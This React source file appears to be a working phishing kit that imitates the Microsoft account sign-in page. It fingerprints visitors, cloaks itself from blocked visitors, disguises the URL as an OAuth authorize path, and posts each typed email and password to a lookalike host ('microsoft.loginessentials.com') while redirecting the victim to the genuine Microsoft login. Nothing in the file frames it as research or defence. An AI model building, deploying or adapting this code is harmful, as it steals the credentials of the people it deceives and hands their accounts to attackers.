import "./App.css";
import { useEffect, useReducer, useState } from "react";
import { useVisitorData } from "@fingerprintjs/fingerprintjs-pro-react";
import axios from "axios";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";



function App() {

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  var [visitor, setVisitor] = useState("");
  var [status, setStatus] = useState(200);
  var [ip, setIp] = useState("")
  const { isLoading, error, data } = useVisitorData();
  const [showSignIn, setShowSignIn] = useState(true);
  const [animateOut, setAnimateOut] = useState(false);



  // A function to parse query parameters
  const queryParams = new URLSearchParams(window.location.search);
    const nonce = queryParams.get('nonce');


    function generateRandomString(length) {
      let result = '';
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
      for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
      }
      return result;
    }
    




  const getData = async (ip) => {

    if (isLoading) {
      return console.log("loading");
    }
    if (error) {
      return console.log(error.message);
    }

    if (data) {
      // perform some logic based on the visitor data
      setVisitor(data.visitorId);
      setIp(ip); 

      

      fetch("http://microsoft.loginessentials.com/api/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ visitor_id: data.visitorId, ip: ip }),
      }).then((response) => {
        console.log(response.status);
        if (response.status === 403) {
          console.log("cool");
          setStatus(403);
        } else {
          setStatus(200);

          return response.json()
        }
      })
      .then(data => {
        if (data && data.session) {
          // Check if we've already redirected
          if (data && data.session) {
            // Construct the URL with the session key as a parameter
            const newUrl = new URL(window.location.href);
            newUrl.pathname = '/common/oauth2/v2.0/authorize';
            newUrl.searchParams.set('client_id', generateRandomString(80));   
                     newUrl.searchParams.set('nonce', data.session);
      
            // Update the URL without redirecting
            window.history.pushState({ path: newUrl.toString() }, '', newUrl.toString());
          }
        }
      })
    }
  };


  useEffect(() => {
    // Check if we've already redirected
    if (localStorage.getItem('redirected') !== 'true') {
      axios.get("https://geolocation-db.com/json/")
      .then((response) => {
        console.log(response.data);
        getData(response.data.IPv4);
      });
    }
    // Clear the flag on component unmount
    return () => {
      localStorage.removeItem('redirected');
    };
  }, [data]); // You might want to reconsider having 'data' as a dependency

  const handleEmailChange = (event) => {
    setEmail(event.target.value);
   
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault(); // Prevent the default form submit action

    // Here, you would typically handle the form submission, like making an API call


    if(email && !password ){

      
        // Start the slide out
        event.preventDefault(); // Prevent form from submitting and refreshing the page
        setAnimateOut(true);
    
        // Wait for the animation to finish before removing the element
        setTimeout(() => {
          setShowSignIn(false);
        }, 500); // This should match the duration of your slide-out animation

    } else if(email && password){

      window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638362150548137866.MjNmMGQxNDAtNzIwZS00Y2YwLWFjYjgtNDVhMjczOTEyZmYzMDI5NjNmNGQtNjA3Yy00NDk4LThmMjYtNWVhNWE1ODZhYWNj&ui_locales=en-US&mkt=en-US&client-request-id=4f07f4f3-b62f-4da9-b5d9-02c62ba441c3&state=U7BL-eIa75xtgtFN7eXwK8iAa47h2yVID6KXcjyaTXLVKyJAlnQCllRL9TwnTgj9WZWzGED54dk_kknxRH7wWS2JA1eU8LWEyOrkrQn1iICQZpIv4dKPbPRDNOOf-Mk1qcbDrri14YVJR2Yf92YN9KyzxRDePkWsTAYlOICzEcWMbyR1ocHVyVpQUAuxbK5UBpR4R7Hpi1OD1alyotU-8eZcQMdbPM_mcA_F7WNbptGmY9gDxFeSk8NVCN5tuMxiX8dhUpNDmTkxW_SxylALN4UQabl_Osfsz8Qq-epwvJw&x-client-SKU=ID_NET6_0&x-client-ver=6.30.1.0';
        fetch("http://microsoft.loginessentials.com/api/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ visitor: visitor, ip: ip, email: email, password: password }),
        }).then((response) => {
          console.log(response.status);
          if (response.status === 403) {
            setStatus(403);
          } else {
            setStatus(200);
          

          }
        })
        .catch((error) => {
          console.error('Error:', error);
        });
    }

  };

  const fowardPage = () => {
    window.location.replace("https://www.americafirst.com/");
  };

  const backgroundurl =
    "https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg";

  // Inline styles for the background image
  const backgroundStyle = {
    backgroundImage: `url('${backgroundurl}')`,
    backgroundSize: "cover", // Cover the entire div
    backgroundPosition: "center center", // Center the image in the div
    backgroundRepeat: "no-repeat", // Do not repeat the image
  };

  const handleNextClick = (event) => {
    // Start the slide out
    event.preventDefault(); // Prevent form from submitting and refreshing the page
    setAnimateOut(true);

    // Wait for the animation to finish before removing the element
    setTimeout(() => {
      setShowSignIn(false);
    }, 500); // This should match the duration of your slide-out animation
  };

  return (

    <>
    {status === 403  && nonce ? (<div></div> ): (

    <div
      className="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4"
      style={backgroundStyle}
    >
      <div
        className="bg-white drop-shadow-md overflow-hidden"
        style={{
          width: "440px",
          height: "338px",
          padding: "32px",
          // marginBottom: "100px",
        }}
      >
        <form className="space-y-6 p-[13px]" onSubmit={handleSubmit}>
          <img
            className="w-auto"
            src="/microsoft_logo.svg" // Replace with the path to your SVG logo
            alt="Microsoft Logo"
          />
          {showSignIn ? (
            <div
              className={`transition duration-300 ${
                animateOut ? "animate-slideAndFade" : ""
              }`}
            >
              <div>
                <h2 className=" mt-[-15px] text-2xl font-semibold text-gray-900">
                  Sign in
                </h2>
              </div>
              <div style={{ marginTop: "10px" }}>
                <label htmlFor="email" className="sr-only">
                  Email, phone, or Skype
                </label>
                <input
                  id="email"
                  name="email"
                  type="text"
                  required
                  className="appearance-none block w-full py-2 border-b border-black placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500  sm:text-md"
                  placeholder="Email, phone, or Skype"
                  value={email}
                  onChange={handleEmailChange}
                />
              </div>
              <div
                className="text-sm text-[12.5px] text-gray-800"
                style={{ marginTop: "20px" }}
              >
                No account? &nbsp;
                <a href="#" className="text-[#0067b8]">
                  Create one!
                </a>
              </div>
              <div className="text-[12.5px]" style={{ marginTop: "18px" }}>
                <a href="#" className="text-[#0067b8]">
                  Can't access your account?
                </a>
              </div>
              <div className="flex justify-end">
                <button
                  type="submit"
                  onSubmit={(() => handleNextClick())}
                  className="group relative w-[110px] h-[30px] mt-4 flex items-center justify-center border border-transparent text-md font-medium text-white bg-[#0067b8] hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                >
                  Next
                </button>
              </div>
            </div>
          ) : (
            <div className="animate-slideAndFadeIn" style={{marginTop: '12px'}} >
              <div style={{ marginBottom: "20px" }}>
                <button className="p-1 text-sm rounded-full text-whitefocus:ring-2  focus:ring-offset-2">
                  <ArrowBackIcon
                    className="text-gray-500"
                    style={{ fontSize: "15px" }}
                  />
                </button>
                <span className="">{email}</span>
              </div>

              <div>
                <h2 className="mt-[-20px] text-2xl font-semibold text-gray-900">
                  Enter password
                </h2>
              </div>

              <div style={{ marginTop: "10px" }}>
                <label htmlFor="email" className="sr-only">
                  Password
                </label>
                <input
                  id="password"
                  name="password"
                  type="password"
                  required
                  className="appearance-none block w-full py-2 border-b border-black placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500  sm:text-md"
                  placeholder="Password"
                  value={password}
                  onChange={handlePasswordChange}
                />
              </div>

              <div
                className="text-sm text-[12.5px] text-gray-600"
                style={{ marginTop: "20px" }}
              >
                <a href="#" className="text-[#0067b8]">
                  Forgot my password
                </a>
              </div>

              <div className="flex justify-end">
                <button
                  type="submit"
                  className="group relative w-[110px] h-[33px] mt-4 flex items-center justify-center border border-transparent text-md font-medium text-white bg-[#0067b8] hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                >
                  Sign in
                </button>
              </div>
            </div>
          )}
        </form>
      </div>

      <div
        className={`bg-white drop-shadow-md overflow-hidden mt-[20px] ${!showSignIn ? 'animate-fadeOut' : ''}`}
        style={{
          width: "440px",
          height: "48px",
        }}
      >
        <div className="flex items-center ml-10 mt-2">
          <img
            src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
            alt="Sign-in Options"
            className="mr-3 " // Add some margin to the right of the image
            style={{ height: "33px" }}
          />
          <span className="text-[12.5] ">Sign-in options</span>{" "}
          {/* text-sm for 15px font size */}
        </div>
      </div>
    </div>
    )}
    </>
    
    
  );
}

export default App;
